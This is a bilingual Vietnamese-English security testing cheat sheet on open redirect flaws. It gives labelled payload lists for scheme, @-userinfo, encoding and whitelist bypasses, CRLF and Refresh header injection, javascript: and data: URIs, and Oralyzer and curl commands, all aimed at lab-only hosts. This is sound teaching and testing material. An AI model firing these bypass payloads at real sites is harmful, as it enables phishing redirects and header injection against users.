# 14. Open Redirect

> [!CAUTION]
> Chỉ dùng trong lab local hoặc hệ thống có ủy quyền rõ ràng. Payload có risk `destructive`, `dos` hoặc `oob` phải chạy trong fixture cô lập, có giới hạn tài nguyên và không có outbound network.

> **Phạm vi kiểm chứng:** Nội dung và payload vẫn ở mức technical review. `static-verified` chỉ xác nhận annotation và kiểm tra tĩnh trong đúng context/version đã ghi; không phải lab evidence và không cho phép sử dụng ngoài phạm vi được ủy quyền.

Open Redirect xảy ra khi ứng dụng chuyển hướng người dùng đến một địa chỉ URL bên ngoài do người dùng kiểm soát mà không xác thực tên miền đích, cho phép kẻ tấn công thực hiện chiến dịch lừa đảo (Phishing).

### 14.1. Scheme & Domain-based Open Redirect (Absolute Redirect & Protocol-Relative Bypass)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi ứng dụng có tham số trong URL chỉ định đường dẫn chuyển hướng như `?redirect=`, `?next=`, `?url=`.
    *   *English*: Redirection parameters are present in URL query segments (such as `?next=`, `?redirect=`).
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi yêu cầu chuyển hướng trỏ về một trang bên ngoài hoặc sử dụng cú pháp dấu gạch chéo kép `//callback.lab.test`.
    *   *English*: Pass external URLs or double slash sequences to test if server maps redirection to external locations.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-14-001 -->
<!-- context: Django 5.0 redirect fixture with trusted and callback HTTPS origins mapped to loopback; the client controls only the next query parameter; case: 14.1. Scheme & Domain-based Open Redirect (Absolute Redirect & Protocol-Relative Bypass) -->
<!-- prerequisites: run both origins locally, clear browser history and test one parser ambiguity at a time while recording the Location header and final origin -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable endpoint returns a Location to callback.lab.test; the fixed parser accepts only the documented local path or exact allowlisted origin -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
    # 1. Basic absolute redirect to external domain
    http://callback.lab.test                                  # Standard external redirection path

    # 2. Protocol-relative double slash bypass
    //callback.lab.test                                       # Browser resolves to scheme matching page protocol

    # 3. Protocol-relative triple slash bypass
    ///callback.lab.test                                      # Evades regexes strictly checking for two slashes

    # 4. Hex-encoded IP redirection target
    http://0x7f000001                                    # Bypasses string checks on loopback IP using Hex

    # 5. Decimal representation of loopback for a local-only parser test
    http://2130706433                                    # Resolves to 127.0.0.1 in compatible URL parsers

    # 6. Authentication bypass using @ separator
    http://trusted.lab.test@callback.lab.test                      # Browser connects to domain following @ symbol

    # 7. Authentication bypass with port mapping
    http://trusted.lab.test:80@callback.lab.test                   # Alternative port routing auth bypass

    # 8. IPv6 address redirection target
    http://[::1]                                         # Dynamic IPv6 loopback route bypass

    # 9. HTTPS to HTTP protocol forcing redirect
    http://callback.lab.test/                                 # Downgrades scheme parameter to HTTP

    # 10. Combined slash/backslash bypass
    /\\\\callback.lab.test                                     # Evades basic directory check algorithms
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Oralyzer để quét phát hiện lỗi chuyển hướng tự động.
    *   *English*: Use Oralyzer to automatically scan parameter inputs for redirect vulns.
<!-- payload-id: CHEAT-14-002 -->
<!-- context: Django 5.0 redirect fixture with trusted and callback HTTPS origins mapped to loopback; the client controls only the next query parameter; case: 14.1. Scheme & Domain-based Open Redirect (Absolute Redirect & Protocol-Relative Bypass) -->
<!-- prerequisites: run both origins locally, clear browser history and test one parser ambiguity at a time while recording the Location header and final origin -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable endpoint returns a Location to callback.lab.test; the fixed parser accepts only the documented local path or exact allowlisted origin; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python oralyzer.py -u "http://victim.lab.test/?next=http://callback.lab.test"
    ```


---

### 14.2. Filter & Whitelist Bypass (Subdomain Spoofing & Path Traversal Bypass)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi truyền tên miền ngoài thì bị chặn, nhưng nếu chèn thêm tên miền gốc thì vượt qua được.
    *   *English*: Standard external redirects are blocked, but requests containing the target domain string pass.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử chèn tên miền gốc làm subdomain, thư mục con hoặc dùng ký tự điều hướng `../` để thoát khỏi tên miền được cấu hình tin cậy.
    *   *English*: Spoof whitelisted domains by nesting them in subdomains, query parameters, or directory segments.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-14-003 -->
<!-- context: Django 5.0 redirect fixture with trusted and callback HTTPS origins mapped to loopback; the client controls only the next query parameter; case: 14.2. Filter & Whitelist Bypass (Subdomain Spoofing & Path Traversal Bypass) -->
<!-- prerequisites: run both origins locally, clear browser history and test one parser ambiguity at a time while recording the Location header and final origin -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: crafted authority/userinfo/encoding reaches callback.lab.test only with the flawed comparison; canonical scheme-host-port matching rejects it -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
    # 1. Subdomain suffix spoofing
    http://callback.lab.test/trusted.lab.test                      # Tricked by presence of trusted segment in path

    # 2. Subdomain prefix spoofing
    http://trusted.lab.test.callback.lab.test                      # Tricked by trusted domain acting as subdomain

    # 3. Path traversal whitelist bypass
    http://trusted.lab.test/../callback.lab.test                   # Directory traversal escaping trusted segment

    # 4. Dynamic DNS wildcard bypass
    http://trusted-bypass.lab.test                            # Reserved fixture name mapped by local test DNS only

    # 5. Double URL encoded redirect parameters
    %252f%252fcallback.lab.test                               # Evades initial signature inspection filters

    # 6. Backslash Windows IIS redirect bypass
    http://trusted.lab.test\\\\callback.lab.test                     # IIS maps backslashes to parameters

    # 7. Null byte truncation whitelist bypass (⚠️ Warning: Null byte domain truncation in URLs is blocked/ignored by modern browsers and HTTP client libraries)
    http://callback.lab.test%00trusted.lab.test                    # ⚠️ Parser stops checking after Null Byte (requires legacy client runtime)

    # 8. Parameter spoofing using hash symbol
    http://callback.lab.test#trusted.lab.test                      # Evaluates trusted segment as URL fragment

    # 9. Parameter spoofing using query parameter
    http://callback.lab.test?trusted.lab.test                      # Evaluates trusted segment as query parameter

    # 10. Overlong UTF-8 slash encoding bypass
    ..%c0%af..%c0%afcallback.lab.test                         # Bypass using non-standard slash mappings
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Oralyzer với danh sách bypass whitelist tùy biến.
    *   *English*: Configure Oralyzer to fuzz redirect parameters using custom bypass payloads.
<!-- payload-id: CHEAT-14-004 -->
<!-- context: Django 5.0 redirect fixture with trusted and callback HTTPS origins mapped to loopback; the client controls only the next query parameter; case: 14.2. Filter & Whitelist Bypass (Subdomain Spoofing & Path Traversal Bypass) -->
<!-- prerequisites: run both origins locally, clear browser history and test one parser ambiguity at a time while recording the Location header and final origin -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: crafted authority/userinfo/encoding reaches callback.lab.test only with the flawed comparison; canonical scheme-host-port matching rejects it; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python oralyzer.py -u "http://victim.lab.test/?next=http://callback.lab.test" --fuzz
    ```


---

### 14.3. Parameter & Protocol Pollution (Parameter Pollution, JS/Data Redirection, CRLF)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng chuyển hướng sử dụng cơ chế javascript hoặc chèn tham số phản hồi.
    *   *English*: Redirection mechanism executes client-side scripts or dynamically injects parameter header values.

<!-- payload-id: CHEAT-14-005 -->
<!-- context: Django 5.0 redirect fixture with trusted and callback HTTPS origins mapped to loopback; the client controls only the next query parameter; case: 14.3. Parameter & Protocol Pollution (Parameter Pollution, JS/Data Redirection, CRLF) -->
<!-- prerequisites: run both origins locally, clear browser history and test one parser ambiguity at a time while recording the Location header and final origin -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the harness records how duplicate parameters and schemes are parsed; the fixed endpoint rejects ambiguity, CRLF and non-HTTP(S) destinations -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Test HTTP Parameter Pollution (HPP) redirect logic
    curl "http://victim.lab.test/?next=trusted.lab.test&next=callback.lab.test"
    # Test CRLF injection in the redirect parameter
    curl -I "http://victim.lab.test/?next=%0d%0aLocation:%20http://callback.lab.test"
    ```
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử truyền giao thức `javascript:` hoặc chèn ký tự xuống dòng `%0d%0a` để tiêm header `Location`.
    *   *English*: Test with `javascript:` uri schemes or inject CRLF sequences to split headers.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-14-006 -->
<!-- context: Django 5.0 redirect fixture with trusted and callback HTTPS origins mapped to loopback; the client controls only the next query parameter; case: 14.3. Parameter & Protocol Pollution (Parameter Pollution, JS/Data Redirection, CRLF) -->
<!-- prerequisites: run both origins locally, clear browser history and test one parser ambiguity at a time while recording the Location header and final origin -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: the harness records how duplicate parameters and schemes are parsed; the fixed endpoint rejects ambiguity, CRLF and non-HTTP(S) destinations -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. HTTP Parameter Pollution (HPP) bypass -->
    ?next=trusted.lab.test&next=callback.lab.test                  # Server reads secondary parameter value

    <!-- 2. JavaScript URI redirection -->
    javascript:alert(1)                                  # Executes javascript inside page environment

    <!-- 3. JavaScript location href redirection -->
    javascript:window.location='http://callback.lab.test'     # Redirects browser context to external site

    <!-- 4. Data URI redirection -->
    data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== # Loads base64 string directly in page

    <!-- 5. CRLF Injection redirection -->
    %0d%0aLocation:%20http://callback.lab.test                 # Injects header lines directly into HTTP response

    <!-- 6. VBScript URI redirection -->
    vbscript:msgbox("test")

    <!-- 7. HTML Entity encoded JS redirect -->
    javascript:&#x61;&#x6c;&#x65;&#x72;&#x74;(1)          # Obfuscates javascript function signatures

    <!-- 8. Redirect via meta refresh header injection -->
    %0d%0aRefresh:%200;url=http://callback.lab.test           # Forces browser reload routing to external URL

    <!-- 9. JS nested redirection in query parameters -->
    javascript:document.body.dataset.sechub='redirect-js-marker' # Local DOM marker; no cookie/network access

    <!-- 10. XML schema redirection inside SVG/XML files -->
    <svg xmlns="http://www.w3.org/2000/svg"><script href="javascript:alert(1)"/></svg>
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Burp Suite Repeater để kiểm tra thủ công phản hồi header khi chèn ký tự CRLF hoặc giao thức javascript.
*   *English*: Use Burp Suite Repeater to manually verify redirection outputs when testing CRLF or javascript protocol strings.

---

## Tài liệu tham khảo

- **[S1]** OWASP Unvalidated Redirects and Forwards Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html — bản hiện hành; truy cập: 2026-07-18.
